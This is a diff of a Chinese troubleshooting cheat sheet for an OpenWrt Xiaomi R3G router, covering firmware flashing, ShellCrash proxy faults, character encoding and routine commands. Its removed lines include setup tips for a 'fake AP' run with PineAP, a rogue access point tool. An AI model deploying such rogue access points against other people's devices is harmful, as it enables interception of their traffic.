-## 九、常见坑与排障速查
+## 五、排障速查
 
-### 9.1 刷机与固件
-- 刷 Breed 前确认原厂固件版本与 OpenWRTInvasion 匹配；刷后验证 `xiaomi.r3g.bootfw=2`。
-- R3G 分高低配，高配（UBI 117MB）直接刷；低配需先扩容，勿混用固件。
-- Breed Web 直接刷 sysupgrade 报数据无效 → 走 initramfs 过渡。
+### 5.1 刷机与固件
 
-### 9.2 假 AP / DHCP
-- 假 AP 网段必须独立，误用与上级重叠网段 → DHCP 池含 WAN IP、ARP 失败。
-- dnsmasq 无 "DHCP, IP range" 日志、67 端口无监听 → UCI 生成失败，直接写 `/etc/dnsmasq.conf`。
-- 禁止 `udhcpc -i br-lan` 自测 DHCP（桥不回环自身包），从桥外发 Discover 验证。
-- iptables FORWARD 拦不住桥内二层 DHCP 转发（br_netfilter 未加载），不要在它身上浪费时间。
-- PineAP CLI 带配置路径会重写丢配置 → 优先 `uci set + uci commit + /etc/init.d/pineapd restart`。
+- 刷 Breed 前确认原厂固件版本与 OpenWRTInvasion 的匹配关系，刷后回 Breed 验证 `xiaomi.r3g.bootfw=2` 是否写入。
+- R3G 分高低配，高配 UBI 117MB 可直接刷；低配需先扩容，两类固件不可混用。
+- Breed Web 直接刷 sysupgrade 报数据无效，改走 initramfs 过渡再刷正式包。
+- 刷机前一律先跑 `sha256sum -c SHA256SUMS`，哈希不符的文件不要刷。
 
-### 9.3 代理（ShellCrash）
-- **hardfloat 内核 Illegal instruction** → 必须 mihomo-mipsle-softfloat。
-- **gzip 压缩极慢/超时** → 电脑侧压好 gz 再 pscp 上传。
-- **opkg 锁死**：`/var/lock/opkg.lock` 被占用 → kill 残留 opkg 进程并删除锁文件；opkg update 慢直接从阿里云镜像 wget ipk 本地安装。
-- **防火墙不生效**：`firewall_area` 缺失/`ipv6_redir` 未定义 → fw_start.sh 报 out of range，nftables 规则不加载；补 `firewall_area=1` + `ipv6_redir=OFF` 后 `sh /etc/ShellCrash/starts/fw_start.sh`。
-- **DNS 死循环**：nameserver/direct-nameserver 指 127.0.0.1 → 改 223.5.5.5。
-- **重启后规则丢失**：afstart.sh 异步等待 CrashCore/utun 超时 → 等 15 秒再查 `nft list table inet shellcrash`，兜底 rc.local 延迟 30 秒重试 fw_start.sh。
-- **.start_error 哨兵**：上次异常退出阻止自启 → `rm -f /etc/ShellCrash/.start_error && /etc/init.d/shellcrash restart`。
-- **订阅假节点**：占位节点（server:1/11）污染 url-test → 本机提取 YAML 时过滤。
-- **CrashCore 日志不可见**：stdout/stderr 重定向 /dev/null，排查靠 API（nc 127.0.0.1 9999）和抓包。
+### 5.2 代理（ShellCrash）
 
-### 9.4 中文与编码
-- SSH/plink 传中文（SSID、节点名、redir_mod 值）易乱码 → 用 printf 十六进制转义：
-  - `"模式"` = `\xe6\xa8\xa1\xe5\xbc\x8f`
-  - `"日本1"` = `\xe6\x97\xa5\xe6\x9c\xac1`
-- URL 中的中文需 percent-encode。
+- **hardfloat 内核 Illegal instruction**：换 `mihomo-mipsle-softfloat`。
+- **gzip 压缩极慢或超时**：在电脑侧压好 gz 再 pscp 上传，不要在路由器上压。
+- **opkg 锁死**：`/var/lock/opkg.lock` 被占用，kill 残留 opkg 进程后删除锁文件；`opkg update` 慢时从阿里云镜像直接 wget ipk 本地安装。
+- **防火墙不生效**：`firewall_area` 缺失或 `ipv6_redir` 未定义导致 `fw_start.sh` 报 out of range、nftables 规则不加载。补 `firewall_area=1` 与 `ipv6_redir=OFF` 后执行 `sh /etc/ShellCrash/starts/fw_start.sh`。
+- **DNS 死循环**：`nameserver` 或 `direct-nameserver` 指向 127.0.0.1，改为 223.5.5.5。
+- **重启后规则丢失**：`afstart.sh` 异步等待 CrashCore 或 utun 超时。等 15 秒再查 `nft list table inet shellcrash`，兜底方案是在 `rc.local` 中延迟 30 秒重试 `fw_start.sh`。
+- **.start_error 哨兵**：上次异常退出会阻止自启，执行 `rm -f /etc/ShellCrash/.start_error && /etc/init.d/shellcrash restart`。
+- **订阅假节点**：`server` 为 `1` 或 `11` 的占位节点污染 `url-test`，在本机提取 YAML 时过滤掉。
+- **CrashCore 日志不可见**：stdout 与 stderr 重定向到 `/dev/null`，排查只能靠 API（`nc 127.0.0.1 9999`）与抓包。
 
-### 9.5 常用命令速查
+### 5.3 中文与编码
+
+SSH/plink 传中文（节点名、`redir_mod` 的值）容易乱码，统一用 printf 十六进制转义：
+
+| 文本 | 转义 |
+| --- | --- |
+| `模式` | `\xe6\xa8\xa1\xe5\xbc\x8f` |
+| `日本1` | `\xe6\x97\xa5\xe6\x9c\xac1` |
+
+URL 中出现中文时需 percent-encode，例如 `日本1` 编码为 `%E6%97%A5%E6%9C%AC1`。
+
+### 5.4 常用命令
 
 ```sh
-# SSH / 传输（电脑侧）
+# SSH 与文件传输（电脑侧）
 plink76.exe -ssh -batch -pw YOUR_ROOT_PASSWORD root@192.168.1.54
 pscp76.exe -pw YOUR_ROOT_PASSWORD 本地文件 root@192.168.1.54:/tmp/
 
-# 互斥切换
-/usr/bin/mode_switch.sh pine|clash|status
-
-# 无线 / 防火墙 / DNS
+# 无线与网络服务
 wifi reload && wifi up radio1
 /etc/init.d/firewall restart
 /etc/init.d/dnsmasq restart
@@ -450,13 +422,8 @@ http_proxy=http://127.0.0.1:7890 wget -q -O - -T5 http://www.gstatic.com/generat
 wget -q -O - http://127.0.0.1:9999/proxies
 ```
 
-### 9.6 参考文档
+### 5.5 参考文档
 
-- U 盘"问题排障"文件夹：
-  - `TROUBLESHOOTING.md`（疑难杂症与避坑手册）
-  - `R3G_ShellCrash_故障排查手册.md`（ShellClash 故障手册）
-  - `R3G全局TUN模式注意事项.md`（TUN 模式变更与注意事项）
-- U 盘根目录：
-  - `刷机指南_必读.txt`（刷机傻瓜指南）
-  - `ShellCrash部署指南.md`（ShellCrash 部署手册）
-*（内容由AI生成，仅供参考）*
+- `docs/R3G_ShellCrash_故障排查手册.md`（ShellCrash 故障手册）
+- 本文第三章 3.4（TUN 模式的启用条件与 mips 平台限制）
+- `docs/R3G刷机常见问题指南.md`（刷机常见问题）
